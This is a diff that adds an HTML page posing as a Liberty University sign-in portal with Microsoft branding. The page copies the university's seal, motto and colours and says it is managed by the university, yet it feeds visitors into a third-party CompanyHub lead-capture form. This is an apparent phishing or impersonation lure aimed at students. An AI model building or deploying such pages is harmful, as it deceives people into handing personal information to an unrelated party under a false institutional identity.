@@ -1,2 +1,674 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign In — Liberty University</title>
+
+<script src="https://app.companyhub.com/scripts/companyhub.forms.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=Libre+Baskerville:ital,wght@0,400;0,700;1,400&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+
+<style>
+/* ── Reset & Tokens ──────────────────────────────────────── */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --red:       #990000;
+  --red-deep:  #6B0000;
+  --red-lt:    #B31B1B;
+  --navy:      #002147;
+  --navy-deep: #001328;
+  --gold:      #C8A84B;
+  --gold-lt:   #DFC070;
+  --white:     #FFFFFF;
+  --off:       #F7F5F2;
+  --cream:     #FAF8F4;
+  --text:      #1A1208;
+  --muted:     #6B6355;
+  --border:    #E2DDD5;
+  --ff-serif:  'Libre Baskerville', Georgia, serif;
+  --ff-sans:   'DM Sans', system-ui, sans-serif;
+}
+
+html, body {
+  height: 100%;
+  font-family: var(--ff-sans);
+  background: var(--off);
+  color: var(--text);
+  overflow-x: hidden;
+}
+
+/* ── Page shell ──────────────────────────────────────────── */
+.page {
+  display: flex;
+  min-height: 100vh;
+}
+
+/* ═══════════════════════════════════════════════════════════
+   LEFT — Brand panel
+═══════════════════════════════════════════════════════════ */
+.brand {
+  width: 44%;
+  flex-shrink: 0;
+  background: var(--red-deep);
+  position: relative;
+  overflow: hidden;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  padding: 52px 56px;
+}
+
+/* Rich texture layers */
+.brand::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background:
+    radial-gradient(ellipse 80% 50% at 110% 20%, rgba(200,168,75,0.18) 0%, transparent 60%),
+    radial-gradient(ellipse 60% 70% at -10% 90%, rgba(0,33,71,0.6) 0%, transparent 60%),
+    linear-gradient(160deg, #8B0000 0%, #5C0000 40%, #3D0000 100%);
+  pointer-events: none;
+}
+
+/* Cross / geometric accent — subtle diagonal lines */
+.brand-texture {
+  position: absolute;
+  inset: 0;
+  background-image:
+    repeating-linear-gradient(
+      -45deg,
+      transparent,
+      transparent 28px,
+      rgba(255,255,255,0.018) 28px,
+      rgba(255,255,255,0.018) 29px
+    );
+  pointer-events: none;
+}
+
+/* Decorative arch shape at top */
+.brand-arch {
+  position: absolute;
+  top: -80px; left: 50%;
+  transform: translateX(-50%);
+  width: 340px; height: 340px;
+  border: 1px solid rgba(200,168,75,0.15);
+  border-radius: 50%;
+  pointer-events: none;
+}
+
+.brand-arch::after {
+  content: '';
+  position: absolute;
+  inset: 24px;
+  border: 1px solid rgba(200,168,75,0.1);
+  border-radius: 50%;
+}
+
+/* ── Seal / Logo ── */
+.brand-logo {
+  position: relative; z-index: 2;
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  animation: fadeUp 0.65s cubic-bezier(0.22,1,0.36,1) both;
+}
+
+.seal {
+  width: 58px; height: 58px;
+  border: 2px solid var(--gold);
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0;
+  position: relative;
+  background: rgba(200,168,75,0.08);
+  box-shadow: 0 0 0 4px rgba(200,168,75,0.1), 0 8px 32px rgba(0,0,0,0.4);
+}
+
+.seal-inner {
+  font-family: var(--ff-serif);
+  font-size: 17px;
+  font-weight: 700;
+  color: var(--gold);
+  letter-spacing: -0.5px;
+  line-height: 1;
+}
+
+.brand-id { line-height: 1.3; }
+.brand-id .sup {
+  font-size: 9.5px; letter-spacing: 2.5px;
+  text-transform: uppercase;
+  color: rgba(255,255,255,0.45);
+  display: block; margin-bottom: 3px;
+}
+.brand-id .main {
+  font-family: var(--ff-serif);
+  font-size: 16px;
+  color: var(--white);
+  font-weight: 700;
+}
+
+/* ── Hero ── */
+.brand-hero {
+  position: relative; z-index: 2;
+  animation: fadeUp 0.7s 0.1s cubic-bezier(0.22,1,0.36,1) both;
+}
+
+.brand-motto {
+  display: inline-flex; align-items: center; gap: 10px;
+  font-size: 9.5px; letter-spacing: 3px;
+  text-transform: uppercase;
+  color: var(--gold);
+  font-weight: 600;
+  margin-bottom: 20px;
+  opacity: 0.9;
+}
+.brand-motto::before {
+  content: '✦';
+  font-size: 8px;
+}
+.brand-motto::after {
+  content: '✦';
+  font-size: 8px;
+}
+
+.brand-hero h1 {
+  font-family: var(--ff-serif);
+  font-size: clamp(30px, 3vw, 44px);
+  font-weight: 700;
+  color: var(--white);
+  line-height: 1.2;
+  margin-bottom: 18px;
+  letter-spacing: -0.3px;
+}
+
+.brand-hero h1 em {
+  color: var(--gold-lt);
+  font-style: italic;
+}
+
+.brand-hero p {
+  font-size: 14px;
+  color: rgba(255,255,255,0.55);
+  line-height: 1.8;
+  max-width: 340px;
+  font-weight: 300;
+}
+
+/* ── Gold divider ── */
+.gold-rule {
+  width: 48px; height: 2px;
+  background: linear-gradient(90deg, var(--gold), transparent);
+  margin: 24px 0;
+  opacity: 0.7;
+}
+
+/* ── Info pills ── */
+.brand-pills {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  position: relative; z-index: 2;
+  animation: fadeUp 0.7s 0.15s cubic-bezier(0.22,1,0.36,1) both;
+}
+
+.pill {
+  display: flex; align-items: center; gap: 10px;
+  font-size: 12.5px; color: rgba(255,255,255,0.55);
+}
+.pill-dot {
+  width: 5px; height: 5px;
+  border-radius: 50%;
+  background: var(--gold);
+  flex-shrink: 0;
+  opacity: 0.7;
+}
+
+/* ── Footer ── */
+.brand-foot {
+  position: relative; z-index: 2;
+  display: flex; gap: 16px; flex-wrap: wrap;
+  animation: fadeUp 0.65s 0.2s cubic-bezier(0.22,1,0.36,1) both;
+}
+.brand-foot a {
+  font-size: 11px; letter-spacing: 0.3px;
+  color: rgba(255,255,255,0.3);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.brand-foot a:hover { color: rgba(255,255,255,0.65); }
+
+/* ═══════════════════════════════════════════════════════════
+   RIGHT — Sign-in panel
+═══════════════════════════════════════════════════════════ */
+.signin-panel {
+  flex: 1;
+  background: var(--cream);
+  display: flex;
+  flex-direction: column;
+  overflow-y: auto;
+}
+
+/* ── Top chrome bar ── */
+.chrome-bar {
+  display: flex; align-items: center;
+  justify-content: space-between;
+  padding: 15px 52px;
+  background: var(--white);
+  border-bottom: 1px solid var(--border);
+  flex-shrink: 0;
+  animation: fadeDown 0.5s cubic-bezier(0.22,1,0.36,1) both;
+}
+
+.ms-badge {
+  display: flex; align-items: center; gap: 8px;
+  font-size: 12px; color: var(--muted);
+  font-weight: 400;
+}
+
+.ms-grid {
+  display: grid; grid-template-columns: 1fr 1fr;
+  gap: 2px; width: 15px; height: 15px;
+}
+.ms-grid span { display: block; border-radius: 1px; }
+.ms-grid span:nth-child(1) { background: #F25022; }
+.ms-grid span:nth-child(2) { background: #7FBA00; }
+.ms-grid span:nth-child(3) { background: #00A4EF; }
+.ms-grid span:nth-child(4) { background: #FFB900; }
+
+.chrome-link {
+  font-size: 11.5px; color: var(--red);
+  text-decoration: none; font-weight: 500;
+  transition: color 0.2s;
+}
+.chrome-link:hover { color: var(--red-deep); text-decoration: underline; }
+
+/* ── Main sign-in area ── */
+.signin-body {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  padding: 44px 52px 52px;
+}
+
+.signin-card {
+  width: 100%;
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  animation: fadeUp 0.6s 0.1s cubic-bezier(0.22,1,0.36,1) both;
+}
+
+/* CompanyHub embed — fully unconstrained */
+#companyhub-form {
+  flex: 1;
+  width: 100%;
+  min-height: 480px;
+  display: block;
+}
+
+#companyhub-form > *,
+#companyhub-form iframe {
+  width: 100% !important;
+  max-width: 100% !important;
+  border: none;
+}
+
+/* Card header */
+.card-head {
+  margin-bottom: 32px;
+}
+
+.card-head .school-tag {
+  display: inline-flex; align-items: center; gap: 7px;
+  background: rgba(153,0,0,0.07);
+  border: 1px solid rgba(153,0,0,0.15);
+  border-radius: 100px;
+  padding: 5px 12px;
+  font-size: 11px; font-weight: 600;
+  color: var(--red);
+  letter-spacing: 0.5px;
+  margin-bottom: 22px;
+}
+
+.card-head .school-tag::before {
+  content: '';
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--red);
+  display: block;
+  animation: pulse 2s ease-in-out infinite;
+}
+
+@keyframes pulse {
+  0%, 100% { opacity: 1; transform: scale(1); }
+  50%       { opacity: 0.5; transform: scale(0.8); }
+}
+
+.card-head h2 {
+  font-family: var(--ff-serif);
+  font-size: 26px; font-weight: 700;
+  color: var(--text);
+  margin-bottom: 6px;
+  line-height: 1.25;
+}
+
+.card-head p {
+  font-size: 13.5px; color: var(--muted);
+  font-weight: 300; line-height: 1.6;
+}
+
+/* Security notice */
+.notice {
+  display: flex; align-items: flex-start; gap: 10px;
+  background: #FFF8F0;
+  border-left: 3px solid var(--gold);
+  border-radius: 0 6px 6px 0;
+  padding: 11px 14px;
+  margin-bottom: 28px;
+  font-size: 12px;
+  color: #7A6020;
+  line-height: 1.6;
+}
+.notice svg { flex-shrink: 0; margin-top: 1px; }
+
+/* ── Form ── */
+.form-group {
+  margin-bottom: 18px;
+}
+
+.form-group label {
+  display: block;
+  font-size: 12px; font-weight: 600;
+  color: var(--text);
+  letter-spacing: 0.4px;
+  margin-bottom: 7px;
+  text-transform: uppercase;
+}
+
+.input-wrap { position: relative; }
+
+.input-wrap input {
+  width: 100%;
+  padding: 12px 16px;
+  border: 1.5px solid var(--border);
+  border-radius: 8px;
+  font-size: 14.5px;
+  font-family: var(--ff-sans);
+  color: var(--text);
+  background: var(--white);
+  transition: border-color 0.2s, box-shadow 0.2s;
+  outline: none;
+}
+
+.input-wrap input:focus {
+  border-color: var(--red);
+  box-shadow: 0 0 0 3px rgba(153,0,0,0.09);
+}
+
+.input-wrap input::placeholder { color: #BDB5AA; }
+
+.pw-toggle {
+  position: absolute;
+  right: 13px; top: 50%;
+  transform: translateY(-50%);
+  cursor: pointer;
+  font-size: 11.5px; font-weight: 600;
+  color: var(--muted);
+  user-select: none;
+  transition: color 0.2s;
+  letter-spacing: 0.3px;
+}
+.pw-toggle:hover { color: var(--red); }
+#pw-field { padding-right: 55px; }
+
+/* Form meta row */
+.form-meta {
+  display: flex; align-items: center;
+  justify-content: space-between;
+  margin: 4px 0 24px;
+}
+
+.check-label {
+  display: flex; align-items: center; gap: 8px;
+  font-size: 13px; color: var(--muted);
+  cursor: pointer;
+}
+.check-label input { accent-color: var(--red); }
+
+.forgot {
+  font-size: 13px; color: var(--red);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.forgot:hover { color: var(--red-deep); text-decoration: underline; }
+
+/* Sign-in button */
+.btn-signin {
+  width: 100%;
+  padding: 13.5px;
+  background: var(--red);
+  color: var(--white);
+  border: none;
+  border-radius: 8px;
+  font-size: 15px; font-weight: 600;
+  font-family: var(--ff-sans);
+  cursor: pointer;
+  transition: background 0.2s, transform 0.12s, box-shadow 0.2s;
+  letter-spacing: 0.3px;
+  box-shadow: 0 4px 16px rgba(153,0,0,0.3);
+  position: relative;
+  overflow: hidden;
+}
+
+.btn-signin::before {
+  content: '';
+  position: absolute; inset: 0;
+  background: linear-gradient(135deg, rgba(255,255,255,0.1) 0%, transparent 55%);
+}
+
+.btn-signin:hover {
+  background: var(--red-lt);
+  box-shadow: 0 6px 20px rgba(153,0,0,0.38);
+}
+.btn-signin:active { transform: scale(0.99); }
+
+.btn-signin.loading {
+  pointer-events: none;
+  opacity: 0.8;
+}
+
+/* Divider */
+.divider {
+  display: flex; align-items: center; gap: 14px;
+  margin: 22px 0;
+  font-size: 11px; letter-spacing: 1.5px;
+  text-transform: uppercase;
+  color: rgba(107,99,85,0.5);
+}
+.divider::before, .divider::after {
+  content: ''; flex: 1; height: 1px;
+  background: var(--border);
+}
+
+/* Microsoft SSO */
+.btn-sso {
+  width: 100%;
+  padding: 12px 16px;
+  border: 1.5px solid var(--border);
+  border-radius: 8px;
+  background: var(--white);
+  display: flex; align-items: center; justify-content: center;
+  gap: 10px;
+  font-size: 13.5px; font-weight: 500;
+  font-family: var(--ff-sans);
+  color: var(--text);
+  cursor: pointer;
+  transition: border-color 0.2s, background 0.2s, box-shadow 0.2s;
+}
+.btn-sso:hover {
+  border-color: #BDB5AA;
+  background: var(--off);
+  box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+}
+
+/* Help links */
+.card-foot {
+  margin-top: 28px;
+  padding-top: 22px;
+  border-top: 1px solid var(--border);
+  display: flex; justify-content: space-between;
+  font-size: 12.5px;
+}
+.card-foot a {
+  color: var(--red); text-decoration: none;
+  transition: color 0.2s;
+}
+.card-foot a:hover { color: var(--red-deep); text-decoration: underline; }
+
+/* ── Bottom chrome ── */
+.chrome-foot {
+  padding: 14px 52px;
+  background: var(--white);
+  border-top: 1px solid var(--border);
+  display: flex; align-items: center;
+  justify-content: space-between;
+  flex-shrink: 0;
+  animation: fadeUp 0.5s 0.25s cubic-bezier(0.22,1,0.36,1) both;
+}
+
+.chrome-foot p { font-size: 11.5px; color: var(--muted); }
+.chrome-foot a {
+  font-size: 11.5px; color: var(--muted);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.chrome-foot a:hover { color: var(--text); }
+
+.chrome-foot-links { display: flex; gap: 18px; }
+
+/* ── Animations ── */
+@keyframes fadeUp {
+  from { opacity: 0; transform: translateY(18px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+@keyframes fadeDown {
+  from { opacity: 0; transform: translateY(-10px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+
+/* ── Responsive ── */
+@media (max-width: 840px) {
+  .page { flex-direction: column; }
+  .brand {
+    width: 100%; padding: 36px 28px;
+    flex-direction: row; flex-wrap: wrap;
+    gap: 24px; align-items: center;
+  }
+  .brand-hero p,
+  .brand-pills,
+  .gold-rule { display: none; }
+  .brand-hero h1 { font-size: 26px; margin-bottom: 0; }
+  .brand-motto { margin-bottom: 10px; }
+  .brand-foot { display: none; }
+
+  .signin-body { padding: 28px 24px 36px; }
+  .chrome-bar, .chrome-foot { padding: 12px 24px; }
+  .chrome-foot-links { display: none; }
+}
+</style>
+</head>
+<body>
+
+<div class="page">
+
+  <!-- ══ LEFT: Liberty Brand Panel ══════════════════════════ -->
+  <div class="brand">
+    <div class="brand-texture"></div>
+    <div class="brand-arch"></div>
+
+    <!-- Seal + name -->
+    <div class="brand-logo">
+      <div class="seal">
+        <div class="seal-inner">LU</div>
+      </div>
+      <div class="brand-id">
+        <span class="sup">Lynchburg, Virginia · Est. 1971</span>
+        <span class="main">Liberty University</span>
+      </div>
+    </div>
+
+    <!-- Hero copy -->
+    <div class="brand-hero">
+      <div class="brand-motto">Training Champions for Christ</div>
+      <h1>Welcome to<br><em>Liberty</em><br>University</h1>
+      <div class="gold-rule"></div>
+      <p>Sign in to access your student portal, Canvas courses, Flames Pass, financial aid, advising, and all Liberty University services.</p>
+    </div>
+
+    <!-- Info pills -->
+    <div class="brand-pills">
+      <div class="pill"><span class="pill-dot"></span>Largest Christian university in the world</div>
+      <div class="pill"><span class="pill-dot"></span>100,000+ students on campus &amp; online</div>
+      <div class="pill"><span class="pill-dot"></span>600+ programs of study</div>
+    </div>
+
+    <!-- Footer links -->
+    <div class="brand-foot">
+      <a href="https://www.liberty.edu">liberty.edu</a>
+      <a href="#">IT Help Desk</a>
+      <a href="#">Accessibility</a>
+      <a href="#">Privacy Policy</a>
+    </div>
+  </div>
+
+  <!-- ══ RIGHT: Sign-in Panel ══════════════════════════════ -->
+  <div class="signin-panel">
+
+    <!-- Top chrome -->
+    <div class="chrome-bar">
+      <div class="ms-badge">
+        <div class="ms-grid">
+          <span></span><span></span><span></span><span></span>
+        </div>
+        Microsoft · Liberty University
+      </div>
+      <a href="https://www.liberty.edu" class="chrome-link">liberty.edu ↗</a>
+    </div>
+
+    <!-- Card -->
+    <div class="signin-body">
+      <div class="signin-card">
+
+        <div class="card-head">
+          <div class="school-tag">Liberty University Portal</div>
+          <h2>Contact<br>Liberty University</h2>
+          <p>Fill out the form below and our team will get back to you shortly.</p>
+        </div>
+
+        <div class="notice">
+          <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+            <path d="M7 1.5a5.5 5.5 0 100 11 5.5 5.5 0 000-11zM7 4v3.5M7 9.5v.5" stroke="#B8860B" stroke-width="1.4" stroke-linecap="round"/>
+          </svg>
+          <span>This page is managed by Liberty University. Your information is protected under Liberty's privacy policy.</span>
+        </div>
+
+        <div id="companyhub-form" style="height: 100%; width: 100%;"></div>
 <script src="https://app.companyhub.com/scripts/companyhub.forms.js"></script><script>companyhubForms.render("https://app.companyhub.com/webtolead/renderform/Mjc1MDU1?name=Liberty_College", "companyhub-form");</script>
 <div id="companyhub-form" style="height: 100%; width: 100%;"></div>
+      </div>
+    </div>
+
+    <!-- Bottom chrome -->
+    <div class="chrome-foot">
+      <p>© 2025 Liberty University. All rights reserved.</p>
+      <div class="chrome-foot-links">
+        <a href="#">Terms of Use</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Accessibility</a>
+        <a href="#">Cookie Settings</a>
+      </div>
+
+
+</body>
+</html>
